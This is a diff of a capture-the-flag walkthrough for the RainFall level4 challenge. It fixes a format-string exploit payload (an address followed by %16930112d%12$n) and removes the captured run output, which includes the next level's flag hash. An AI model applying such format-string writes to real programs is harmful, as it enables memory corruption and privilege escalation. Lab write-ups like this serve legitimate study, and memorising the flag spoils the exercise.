@@ -90,7 +90,7 @@ We inject the address of `m` into the input, followed by a format string to writ
 Also it needs to be written at the 12th position.
 
 ```bash
-python -c 'print "\x10\x98\x04\x08" + "16930112d%12$n"' > /tmp/exploit
+python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
 ```
 
 Explanation:
@@ -104,9 +104,7 @@ Explanation:
 ## Step 7: Run Exploit
 
 ```bash
-level4@RainFall:~$ cat /tmp/exploit | ./level4
-                                                                                     -1208015184
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+cat /tmp/exploit | ./level4
 ```
 
 We successfully overwrite `m` and trigger the hidden shell.
@@ -114,6 +112,7 @@ We successfully overwrite `m` and trigger the hidden shell.
 ---
 
 > With this, you can `su level5` using the password.
+
 
 
 
